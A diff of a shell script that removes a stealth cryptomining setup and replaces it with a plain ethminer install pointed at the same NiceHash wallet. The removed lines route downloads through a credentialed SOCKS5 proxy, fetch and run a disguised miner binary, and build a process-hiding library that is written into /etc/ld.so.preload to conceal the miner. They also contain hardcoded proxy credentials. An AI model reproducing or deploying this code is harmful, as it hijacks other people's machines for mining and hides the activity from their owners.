@@ -1,48 +1,15 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+nvidia-smi -L
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
+sudo add-apt-repository ppa:ethereum/ethereum
+sudo cat /etc/apt/sources.list
+sudo apt update
+sudo apt install ethereum
+wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+ls
+tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+cd bin/
 
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 23.254.18.131:7703
-socks5_username = sikencot
-socks5_password = mbah2237
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.AkuUcup@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+echo "Enter worker name: "
+read ans
+./ethminer -U -P stratum2+tcp://343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$ans@daggerhashimoto.usa-west.nicehash.com:3353
